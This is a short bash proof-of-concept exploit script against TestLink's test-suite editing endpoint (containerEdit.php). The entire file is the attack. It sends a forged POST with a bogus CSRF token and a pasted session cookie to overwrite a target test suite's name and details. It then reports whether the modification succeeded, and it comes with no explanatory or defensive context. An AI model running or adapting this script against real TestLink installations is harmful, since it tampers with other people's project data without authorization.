#!/bin/bash
# PS: Change the Cookie Value before of launch the exploit 

HOST=$1
TESTSUITEID=$2

if [ -z $HOST ] || [ -z $TESTSUITEID ] 
then
    echo 'Usage: ./modifyTestSuite.sh HOST TEST_SUITE_ID';
else
    RESPONSE=$(curl -s -X POST "http://"$HOST"/lib/testcases/containerEdit.php?testsuiteID="$TESTSUITEID --data "CSRFName=rapt00r&CSRFToken=rapt00r&containerType=testsuite&doAction=update_testsuite&container_name=This+Exploit+Works+:)&details=I+Can+Modify+Your+Test+Suite&ot_removedLeft=&ot_removedRight=&ot_addedLeft=&ot_addedRight=&ot_newLeft=1%2C2%2C3&ot_newRight" -H "Cookie: PHPSESSID=jflvia0brpdrpslr9hdc596ok6; TESTLINK_USER_AUTH_COOKIE=854053dbbf6482b1f59208fcac7eb14ef05dd6855dc5ced499792f0009b5a640; TESTLINK197TL_lastTestPlanForUserID_1=11; TL_lastTestProjectForUserID_4=5; ys-edit_tc_tproject_id_5_ext-comp-1001=a%3As%253A/5")
    if (echo $RESPONSE | grep "login.php?note=expired&destination=" > /dev/null)
    then
        echo "The Test Suite don't has modified";
    else
        echo "The Test Suite has been modified";
    fi
fi